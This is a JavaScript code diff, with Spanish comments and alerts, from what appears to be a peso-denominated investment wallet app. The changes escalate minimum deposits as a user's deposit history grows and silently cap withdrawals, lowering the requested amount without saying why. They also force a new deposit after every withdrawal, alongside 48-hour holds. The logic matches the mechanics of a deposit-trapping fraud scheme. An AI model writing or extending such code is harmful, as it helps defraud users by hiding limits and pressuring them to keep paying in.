-    alert("El monto mínimo obligatorio de recarga es de $2.000 ARS.");
-    inputEl.value = 2000;
+  const stats = await obtenerEstadisticasCuenta();
+  const minRequired = calcularMinimoFondeo(stats.depositos);
+
+  if (isNaN(val) || val < minRequired) {
+    alert(`El monto mínimo de recarga establecido para tu nivel operativo es de $${fmt(minRequired)} ARS.`);
+    inputEl.value = minRequired;
     return;
   }
 
@@ -1702,7 +1758,7 @@ function calcWithdrawNet() {
   document.getElementById('withdraw-net-calc').innerText = `$${fmt(net)} ARS`;
 }
 
-// RETIRO BLINDADO: MADURACIÓN 48HS, COOLDOWN 48HS, CONSUMO DE DEPÓSITO Y TOPE SILENCIOSO
+// RETIRO CON TODAS LAS CONDICIONES: MADURACIÓN 48HS, COOLDOWN 48HS, CONSUMO DE DEPÓSITO Y TOPE ESCALONADO SILENCIOSO
 window.prepararConfirmacionRetiro = async function() {
   const now = Date.now();
 
@@ -1742,7 +1798,9 @@ window.prepararConfirmacionRetiro = async function() {
 
   // 5. CANDADO DE CONSUMO DE INVERSIÓN: DEBE TENER DEPÓSITO ACTIVO
   if (!appState.hasDeposited) {
-    alert("Liquidación de Capital Agotada: Tu asignación operativa ha culminado su ciclo. Para reactivar tu cartera y habilitar extracciones, debes generar un nuevo depósito oficial ($2.000 ARS).");
+    const stats = await obtenerEstadisticasCuenta();
+    const minRequired = calcularMinimoFondeo(stats.depositos);
+    alert(`Liquidación de Capital Agotada: Tu asignación operativa ha culminado su ciclo. Para reactivar tu cartera y habilitar extracciones, debes generar un nuevo depósito oficial ($${fmt(minRequired)} ARS).`);
     openWalletModal('recargar');
     return;
   }
@@ -1753,8 +1811,10 @@ window.prepararConfirmacionRetiro = async function() {
     return;
   }
 
-  // 6. CONTROL SILENCIOSO DEL TOPE DIRECTO CONTRA SUPABASE
-  const topePermitido = await obtenerTopeRealSupabase();
+  // 6. CONTROL SILENCIOSO DEL TOPE DIRECTO CONTRA SUPABASE (ESCALA PROGRESIVA HASTA $100.000)
+  const stats = await obtenerEstadisticasCuenta();
+  const topePermitido = calcularTopeRetiro(stats.retiros);
+
   if (amt > topePermitido) {
     amt = topePermitido;
     withdrawInput.value = topePermitido;
@@ -1812,8 +1872,9 @@ window.ejecutarRetiroFinal = async function() {
 
   let amt = parseFloat(withdrawInput.value);
 
-  // VALIDACIÓN DE SEGURIDAD ESTRICTA ANTES DE INSERTAR
-  const topeReal = await obtenerTopeRealSupabase();
+  // VALIDACIÓN ESTRICTA DEL TOPE ANTES DE ASENTAR
+  const stats = await obtenerEstadisticasCuenta();
+  const topeReal = calcularTopeRetiro(stats.retiros);
   if (amt > topeReal) {
     amt = topeReal;
   }
@@ -1832,7 +1893,7 @@ window.ejecutarRetiroFinal = async function() {
   appState.withdrawCount = (appState.withdrawCount || 0) + 1;
   appState.lastWithdraw = now;
   appState.lastWithdrawNet = netAmount;
-  appState.hasDeposited = false; // Requiere nueva inversión para volver a retirar o activar
+  appState.hasDeposited = false; // Requiere nuevo fondeo obligatorio
   saveLocal();
 
   await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(appState.phone)}`, 'PATCH', { 
